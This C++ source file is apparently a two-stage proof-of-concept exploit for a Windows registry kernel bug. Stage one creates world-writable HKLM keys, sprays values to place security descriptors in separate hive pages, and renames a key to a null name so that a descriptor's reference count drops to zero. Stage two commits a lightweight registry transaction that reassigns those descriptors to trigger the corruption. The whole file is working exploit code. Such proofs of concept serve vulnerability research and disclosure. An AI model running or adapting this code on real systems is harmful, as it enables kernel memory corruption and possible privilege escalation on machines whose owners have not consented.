#include <Windows.h>
#include <winternl.h>
#include <sddl.h>

#include <cstdio>

#pragma comment(lib, "ntdll")

extern "C" {

NTSTATUS NTAPI NtRenameKey(HANDLE, PUNICODE_STRING);
NTSTATUS NTAPI NtCreateRegistryTransaction(PHANDLE, DWORD, POBJECT_ATTRIBUTES, DWORD);
NTSTATUS NTAPI NtCommitRegistryTransaction(HANDLE, DWORD);

}  // extern "C"

int Stage1() {
  //
  // Create four keys in a world-writable location under HKLM\Software, each
  // with a unique security descriptor that will hopefully land in a different
  // hive page (we try to achieve this by spraying with values in between each
  // key creation).
  //

  LONG st;
  HKEY hTestKeys[4];

  for (ULONG i = 0; i < 4; i++) {

    //
    // Construct the custom descriptor.
    //

    WCHAR szSD[100];
    _snwprintf_s(szSD, sizeof(szSD) / sizeof(szSD[0]),
                 L"D:(A;;KA;;;WD)(A;;KA;;;S-1-5-21-123456789-123456789-123456789-%u)", i + 1);

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = FALSE;

    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
            szSD, SDDL_REVISION_1, &sa.lpSecurityDescriptor, NULL)) {
      printf("ConvertStringSecurityDescriptorToSecurityDescriptorW failed with "
             "error %u\n", GetLastError());
      return 1;
    }

    //
    // Create the subkey.
    //

    WCHAR szKeyName[100];
    _snwprintf_s(szKeyName, sizeof(szKeyName) / sizeof(szKeyName[0]),
                 L"Software\\Microsoft\\DRM\\TestKey%u", i + 1);

    st = RegCreateKeyExW(HKEY_LOCAL_MACHINE,
                         szKeyName,
                         0,
                         NULL,
                         0,
                         KEY_ALL_ACCESS,
                         &sa,
                         &hTestKeys[i],
                         NULL);

    if (st != ERROR_SUCCESS) {
      printf("RegCreateKeyExW failed with error %d\n", st);
      return 1;
    }

    //
    // Create a bunch of values to separate the security descriptors from each
    // other in the hive.
    //

    BYTE ValueData[100] = { /* zeros */ };

    for (ULONG j = 0; j < 1000; j++) {
      WCHAR szValueName[10];

      _snwprintf_s(szValueName, sizeof(szValueName) / sizeof(szValueName[0]),
                   L"%.8x", j);

      st = RegSetValueExW(hTestKeys[i],
                          szValueName,
                          0,
                          REG_BINARY,
                          ValueData,
                          sizeof(ValueData));

      if (st != ERROR_SUCCESS) {
        printf("RegSetValueExW failed with error %d\n", st);
        return 1;
      }
    }
  }

  //
  // Rename "TestKey2" to start with \0, in order to have it removed from the
  // hive on next reboot, and set the ReferenceCount of its corresponding
  // security descriptor to 0.
  //

  UNICODE_STRING NewName = { 2, 2, (PWSTR)L"\x00\x00" };

  NTSTATUS Status = NtRenameKey(hTestKeys[1], &NewName);

  if (!NT_SUCCESS(Status)) {
    printf("NtRenameKey failed with error %x\n", Status);
    return 1;
  }

  //
  // Flush the above changes to disk.
  //

  st = RegFlushKey(hTestKeys[0]);

  if (st != ERROR_SUCCESS) {
    printf("RegFlushKey failed with error %d\n", st);
    return 1;
  }

  //
  // Reboot the system (in this case, ask the user to do it).
  //

  printf("Stage 1 of the exploit complete, please reboot the system... ");
  getchar();

  return 0;
}

int Stage2() {
  //
  // Create a lightweight registry transaction.
  //

  HANDLE hTrans;
  NTSTATUS Status = NtCreateRegistryTransaction(&hTrans,
                                                TRANSACTION_ALL_ACCESS,
                                                NULL,
                                                0);

  if (!NT_SUCCESS(Status)) {
    printf("NtCreateRegistryTransaction failed with error %.8x\n", Status);
    return 1;
  }

  //
  // Open HKLM\Software\Microsoft\DRM\TestKey1 in the scope of a transaction.
  //

  HKEY hTransactedKey;
  LONG st = RegOpenKeyTransactedW(HKEY_LOCAL_MACHINE,
                                  L"Software\\Microsoft\\DRM\\TestKey1",
                                  0,
                                  KEY_ALL_ACCESS,
                                  &hTransactedKey,
                                  hTrans,
                                  NULL);

  if (st != ERROR_SUCCESS) {
    printf("RegOpenKeyTransactedW failed with error %d\n", st);
    return 1;
  }

  //
  // First, transactionally set the security of TestKey1 to the descriptor
  // of the former TestKey2 (now with ReferenceCount=0).
  //

  PSECURITY_DESCRIPTOR lpSecurityDescriptor;

  if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
          L"D:(A;;KA;;;WD)(A;;KA;;;S-1-5-21-123456789-123456789-123456789-2)",
          SDDL_REVISION_1,
          &lpSecurityDescriptor,
          NULL)) {
    printf("ConvertStringSecurityDescriptorToSecurityDescriptorW failed with "
           "error %u\n", GetLastError());
    return 1;
  }

  st = RegSetKeySecurity(hTransactedKey,
                         DACL_SECURITY_INFORMATION,
                         lpSecurityDescriptor);

  if (st != ERROR_SUCCESS) {
    printf("RegSetKeySecurity failed with error %d\n", st);
    return 1;
  }

  //
  // Next, set the security descriptor of TestKey1 to the descriptor of
  // TestKey4.
  //

  if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
          L"D:(A;;KA;;;WD)(A;;KA;;;S-1-5-21-123456789-123456789-123456789-4)",
          SDDL_REVISION_1,
          &lpSecurityDescriptor,
          NULL)) {
    printf("ConvertStringSecurityDescriptorToSecurityDescriptorW failed with "
           "error %u\n", GetLastError());
    return 1;
  }

  st = RegSetKeySecurity(hTransactedKey,
                         DACL_SECURITY_INFORMATION,
                         lpSecurityDescriptor);

  if (st != ERROR_SUCCESS) {
    printf("RegSetKeySecurity failed with error %d\n", st);
    return 1;
  }

  //
  // Flush all pending changes to disk.
  //

  st = RegFlushKey(hTransactedKey);

  if (st != ERROR_SUCCESS) {
    printf("RegFlushKey failed with error %d\n", st);
    return 1;
  }

  //
  // Commit the transaction, thus triggering the bug.
  //

  Status = NtCommitRegistryTransaction(hTrans, 0);

  if (!NT_SUCCESS(Status)) {
    printf("NtCommitRegistryTransaction failed with error %.8x\n", Status);
    return 1;
  }

  printf("Stage 2 of the exploit complete.");

  return 0;
}

int wmain(int argc, wchar_t** argv) {
  int ret = 0;

  if (argc != 2) {
    wprintf(L"Usage: %s <stage 1/2>\n", argv[0]);
    return 1;
  }

  CONST INT Stage = _wtoi(argv[1]);

  if (Stage == 1) {
    ret = Stage1();
  } else {
    ret = Stage2();
  }

  return ret;
}
